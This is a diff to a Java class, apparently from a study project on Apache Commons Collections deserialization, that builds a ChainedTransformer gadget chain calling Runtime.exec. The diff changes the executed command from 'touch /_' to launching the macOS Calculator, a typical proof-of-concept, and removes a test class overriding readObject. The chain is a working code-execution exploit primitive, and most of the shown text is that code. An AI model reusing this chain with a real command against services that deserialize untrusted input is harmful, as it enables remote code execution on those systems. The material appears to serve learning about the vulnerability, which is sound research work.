@@ -30,7 +30,7 @@ public class SerializeMapForTransformer
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                 new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
-                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"touch /_"}),
+                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"/Applications/Calculator.app/Contents/MacOS/Calculator"}),
         };
         Transformer transformer = new ChainedTransformer(transformers);
 
@@ -40,8 +40,6 @@ public class SerializeMapForTransformer
         //测试TransformerMap在map的key、value改变中触发
 //        testMap(transformer);
 
-        //测试重写readObject方法反序列化
-//        testReadObject();
 
     }
 
@@ -79,24 +77,4 @@ public class SerializeMapForTransformer
         innerMap.put("2","orange");
     }
 
-    /**
-     * 测试重写readObject是否可以在反序列化中优先执行
-     *
-     */
-    private static void testReadObject() throws Exception {
-        A a = new A();
-        //序列化
-        byte[] bytes = SerializeUtil.serialize(a);
-        A a1 = SerializeUtil.deserialize(bytes);
-    }
-
-}
-
-/**
- * 测试readObject重写类
- */
-class A implements Serializable{
-    private void readObject(ObjectInputStream var1) {
-        System.out.println("exec readObject");
-    }
 }
